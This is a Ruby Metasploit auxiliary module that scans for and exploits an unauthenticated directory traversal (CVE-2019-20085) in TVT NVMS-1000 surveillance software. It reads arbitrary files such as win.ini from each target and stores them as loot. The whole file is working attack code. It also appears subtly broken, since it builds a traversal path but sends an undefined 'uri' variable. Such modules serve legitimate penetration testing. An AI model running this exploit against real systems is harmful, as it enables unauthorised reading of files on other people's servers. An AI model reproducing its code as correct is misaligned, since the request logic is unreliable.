##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'TVT NVMS-1000 Directory Traversal',
      'Description' => %q{
        This module exploits an unauthenticated directory traversal vulnerability which
        exists in TVT network surveillance management software-1000 version 3.4.1.
        NVMS listens by default on port 80.
      },
      'References'  =>
        [
          ['CVE', '2019-20085'],
          ['EDB', '47774']
        ],
      'Author'      =>
        [
          'Numan Türle', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
      'DisclosureDate' => '2019-12-12',
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ])
      ])
  end

  def data
    Rex::Text.rand_text_alpha(3..8)
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    traversal = '/../' * datastore['DEPTH'] + filename

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => uri
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      'nvms.traversal',
      'text/plain',
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end
